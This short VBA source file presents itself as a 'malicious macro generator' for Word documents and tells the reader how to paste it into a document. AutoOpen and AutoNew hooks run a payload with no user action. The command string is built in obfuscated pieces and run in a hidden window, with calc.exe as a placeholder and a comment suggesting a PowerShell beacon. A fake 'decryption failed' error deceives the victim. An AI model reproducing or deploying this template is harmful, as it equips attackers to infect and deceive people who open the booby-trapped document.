' SilentDoc - Malicious Macro Generator
' Copy this into a Word Document -> Developer Tab -> Visual Basic -> ThisDocument
' Capabilities: AutoOpen (Zero Interaction on open), Payload Execution

Sub AutoOpen()
    ' Runs immediately when document is opened
    ExecutePayload
End Sub

Sub AutoNew()
    ' Runs when new document created from template
    ExecutePayload
End Sub

Function ExecutePayload()
    ' Obfuscated Execution
    Dim cmd As String
    
    ' Payload: Pop Calculator (Replace with powershell beacon)
    ' "cmd.exe /c calc.exe"
    cmd = "c" & "m" & "d" & "." & "e" & "x" & "e" & " " & "/" & "c" & " " & "c" & "a" & "l" & "c" & "." & "e" & "x" & "e"
    
    ' Stealth execution (Hidden Window)
    ' WScript.Shell is standard, but often flagged.
    ' Alternative: Shell function
    Shell cmd, vbHide
    
    ' Fake Error Message to deceive user
    MsgBox "Document decryption failed. Please update Microsoft Office.", vbCritical, "Decryption Error"
End Function
